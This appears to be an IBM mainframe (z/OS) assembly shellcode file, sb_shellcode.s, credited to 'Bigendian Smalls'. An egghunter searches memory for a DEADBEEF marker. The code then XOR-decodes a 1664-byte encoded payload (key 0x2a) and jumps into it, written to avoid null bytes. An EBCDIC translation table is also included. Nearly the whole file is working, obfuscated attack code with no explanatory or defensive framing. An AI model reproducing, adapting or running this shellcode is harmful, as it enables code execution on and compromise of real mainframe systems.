         TITLE 'sb_shellcode.s                                         x
               Author:  Bigendian Smalls'
         ACONTROL AFPR
SBSHELL  CSECT
SBSHELL  AMODE 31
SBSHELL  RMODE ANY
         SYSSTATE ARCHLVL=2                   
         ENTRY MAIN
MAIN     DS    0F                              
** Begin setup and stack management **
         STM   6,4,12(13)     # store all the registers in old SP area
         LARL  15,*-4         # put base addr into R15 
         LR    12,15          # put given base addr into R12
         XR    1,1            # zeroout R1 for counting
         XR    2,2            # zeroout R1 for counting
         XR    3,3            # zeroout R3
         AFI   1,X'01010102'  # loading a 1 in R1 
         AFI   2,X'01010103'  # loading a 1 in R1 
         XR    1,2            # loading a 1 in R1
         LR    4,1            #  will put a 4 in R4
         SLA   4,1(1)         # make R1 == 4
         XR    10,10          # zeroout R10 for our egg
         XR    2,2            # zero 2
         LGFI  10,X'deadbeef' # load egghunter value into R10
         LR    11,12          # load  base int R11
LOOPER   AR    11,1           # add 1 to R11 
         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0
         CR    10,3           # compare egg with R11 mem pointer 
         BRC   7,LOOPER       # branch anything but equal
         AR    11,4           
         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0
         CR    10,3           # compare egg with R11 mem pointer 
         BRC   7,LOOPER       # 2nd check 2 in a row good to go!
         AR    11,1           # 1 for the offset from above
         SR    11,4           # 4 to skip last egg
         ST    13,4(,11)      # store old SP for later in wkg area
         ST    11,8(,13)      # store this in old wking area
         LR    13,11          # set up R13 pt to new wkg area
** End setup and stack management **
** Begin main decoding routine    **
         LR    3,11           # This is now our egghunter loc
         AR    3,4            # add 4 to 3
         AR    3,4            # R3 points to SC for decoding
         LR    5,3            # R5 points to SC for jumping to
         SR    3,1            # R3-1 to we can XI that addr w/o nulls
         SR    3,1            # R3-1 to we can XI that addr w/o nulls
         LR    4,1            # R4 has static 1
         XR    1,1            # R1 will be our byte counter
         XR    2,2            # R2 will be address pointer
LOOP1    AR    1,4            # add 1 to R1 byte counter
         ARK   2,3,1          # generate new address pointer
* put the XOR key  (enc buffer char) from below in the quotes below
         XI    1(2),X'2a'     # xor byte with key
* put the buffer len (num of bytes) in the next cmd in CHI 1,<here>
         CHI   1,1664         # to yield sc len
         BRC   4,LOOP1        # loop bwd 18 bytes if R1 < size
         XR    4,4
** Begin cleanup and stack management **
         L     13,4(4,11)     # reload old SP 
         LM    6,4,12(13)     # restore registers 
         BCR   15,5           # jmp to sc 
** End main decoding routine    **
         DC    X'DEADBEEF'     #egg
         DC    X'DEADBEEF'     #egg + old sp
*******************************************************************
*Buffer length:      3328
*Number of bytes:    1664
*Padding bytes:         0
*Enc buffer char:  0x2a
*ASM buffer:
         DC    X'bac6fa26eadad5d5d5d43225ea6a2a2a28fc7afa6a2e32fe8db22aX
               2b8de22a2e8dde2a6cea1a2a2a2a22fd191a2a1a2a3d192dd42a2a2aX
               2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2aX
               2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2aea3ad5d5d5cceeX
               c52a2a288fc6122a3d2a54311331738d'
         DC    X'162a2e8d762a2e301b307bc61f2a22aa5c7a1a1a2a30168dded5d0X
               8f70aa2a7a7a7a2a2fc5eec72a2a28a02dd4eed72a2a28be8dcfd593X
               ea5a2a2a28a3ee55d5d5d596ea5a2a2a28abee55d5d5d592ea5a2a2aX
               2853ee55d5d5d59eea5a2a2a285fee55d5d5d59aea5a2a2a28adee55X
               d5d5d5868d122a2c8d722a228dcfd59d'
         DC    X'eed72a2a28478dcfd5baea5a2a2a285cee55d5d5d5b9ea5a2a2a28X
               58ee55d5d5d5a5ea5a2a2a2886ee55d5d5d5a18d122a2e8d722a2c8dX
               cfd5b032d6ee47d5d5d5a9c64d28062a54eed72a2a2861ea5a2a2a28X
               7eee55d5d5d55bea5a2a2a281cee55d5d5d5478d122a298d722a2f8dX
               cfd554eed72a2a28128dcfd57dea5a2a'
         DC    X'2a2817ee55d5d5d570ea5a2a2a2869ee55d5d5d57cea5a2a2a281fX
               ee55d5d5d578ea5a2a2a2813ee55d5d5d5648d122a2f8d722a2c8dcfX
               d5718dcf2b5cee752a2a287dee452a2a287c8dcf2b44ee752a2a2879X
               ee452a2a2878eed72a2a2bd18dcfd50e8d122a2b8d722a298dcfd56aX
               ee07d5d5d50ec60d2a522a546b0a2a23'
         DC    X'ee772a2a2816324f8dcf2b0eee772a2a281a324f8dcf2b346b0a2aX
               22ee772a2a2806ea4b2a2a2a2a8dcf2b3eee772a2a2808ea4b2a2a2aX
               2b8dcf2b26ee772a2a2830ea4b2a2a2a288dcf2b2e6b0a2a23ee772aX
               2a2838324f8dcf2ad6ee772a2a2820324f8dcf2adceed72a2a2b9c8dX
               cfd4f7ea5a2a2a2bf9ee55d5d5d4ca30'
         DC    X'56ee55d5d5d4f4ea5a2a2a2be5ee55d5d5d4f03056ee552a2a2be6X
               3056ee55d5d5d4fe3056ee552a2a2be23056ee55d5d5d4e4ea5a2a2aX
               2ba3ee55d5d5d4e0ee55d5d5d4e3ee55d5d5d4e2ee55d5d5d4edee55X
               d5d5d4ec8d122a218d722a278dcfd4ed8d2f2b766b0a2a23ee772a2aX
               2bef324f8dcf2a85ee772a2a2b97324f'
         DC    X'8dcf2a836b0a2a2eee772a2a2bad8d422a2d8dcf2a8aee772a2a2bX
               868d422a2c8dcf2ab3ea7a2a2a2b53eaaa2a2a2a268dcf2a318dcf2aX
               caea7a2a2a2b8b8dcf2a70ea7a2a2a2bbceaaad5d5d5c48dcf2a268dX
               cf2ad4eacad5d5d5dcea7a2a2a2b778dde2a62eed72a2a2b6832948dX
               cfd474ea0a2a2a2b58fd290a2a0a2aea'
         DC    X'0a2a2a2b4efd250a2a0a2aee75d5d5d472ea5a2a2a2b71ee552a2aX
               2b7eea5a2a2a2b7bee55d5d5d464ea5a2a2a2b25ee55d5d5d460ea5aX
               2a2a2b6dee55d5d5d46cea5a2a2a2b61ee55d5d5d4688d122a2c8d72X
               2a2d8dcfd46732c132d3ee472a2a2b17c648ca2a2ad4c642aa2ad5d4X
               8d2f2af2eed72a2a2ad432948dcfd432'
         DC    X'ee75d5d5d434ea5a2a2a2b0bee552a2a2b30ea5a2a2a2b3dee55d5X
               d5d43eea5a2a2a2affee55d5d5d43aea5a2a2a2b3dee55d5d5d4268dX
               122a2f8d722a2d8dcfd43332c1ee47d5d5d42e32dcc6422a80d5542dX
               d4eed72a2a2afa32948dcfd7c2ee752a2a2ad4ee052a2a2ad7ee452aX
               2a2ad6ea5a2a2a2adfee55d5d5d7c830'
         DC    X'56ee55d5d5d7ca3056ee55d5d5d7f48d122a2e8d722a2c8dcfd7c7X
               32c1ee57d5d5d7fcc6522a55d5542dd4eed72a2a2a8d32948dcfd797X
               ea5a2a2a2af3ee55d5d5d7ea3056ee55d5d5d7948d122a298d722a2fX
               8dcfd7e5ee47d5d5d79d8dd22a49c6422a4ad554ee772a2a2aebee47X
               2a2a2aea32c12dd4ea3a2a2a2a83ee67'
         DC    X'2a2a2a848da22a3fea0a2a2a2aeb3d4cc91a3a2a2a5cea112a2a2aX
               d533128d5e2a228d722aaf687a3a2a8dde2a25c97a0a2a2a5cea712aX
               2a2ad530433003331f8d5ed5dd684a3a2a303331638d5ed5f42dd4eeX
               672a2a2aaeea3a2a2a2a538da22aafea0a2a2a2abe3103c91a3a2a2aX
               5cea112a2a2ad533128d5e2a2c8d122a'
         DC    X'4f8dde2a233009c91a0a2a2a5cea112a2a2ad5681a3a2a30333163X
               8d5ed5ce2dd43dd5ea6a2a2a2a3a7ada6a2a72fa6a2eb2c6fa26ea6aX
               2a2a2a2d72da6a2a2dd42a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2bX
               2a2a2a282b7919962b79198e2b791d3a2b791c1c2b791c422b791c0eX
               2b7919342b7919a02b7918662b79192c'
         DC    X'2a2a2a2a2a2a2a3a2a2a2a2a2a2a2a2a3a282a2a2a2a2a2a2a2a2aX
               2a2a2a2a2a2a2a2a2d4ba8a3bf4b88a22a2a2a2a2b2a2a2a282a2a2aX
               2a88a22a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a3a08080808080808X
               0808080808080808082a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2aX
               2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a'
         DC    X'2a2a2a2a2a28281a132a2a2a2a'
E2ABU    DC    X'0102039c09867f978d8e0b0c0d0e0f101112139d0a08871819928fX
               1c1d1e1f808182838485171b88898a8b8c0506079091169394959604X
               98999a9b14FF9e1a20a0e2e4e0e1e3e5e7f1a22e3c282b7c26e9eaebX
               e8edeeefecdf21242a293b5e2d2fc2c4c0c1c3c5c7d1a62c255f3e3fX
               f8c9cacbc8cdcecfcc603a2340273d22'
         DC    X'd8616263646566676869abbbf0fdfeb1b06a6b6c6d6e6f707172aaX
               bae6b8c6a4b57e737475767778797aa1bfd05bdeaeaca3a5b7a9a7b6X
               bcbdbedda8af5db4d77b414243444546474849adf4f6f2f3f57d4a4bX
               4c4d4e4f505152b9fbfcf9faff5cf7535455565758595ab2d4d6d2d3X
               d530313233343536373839b3dbdcd9da'
         DC    X'9f'
******************************************************************
         DC    X'8BADF00D'   eof marker
         END
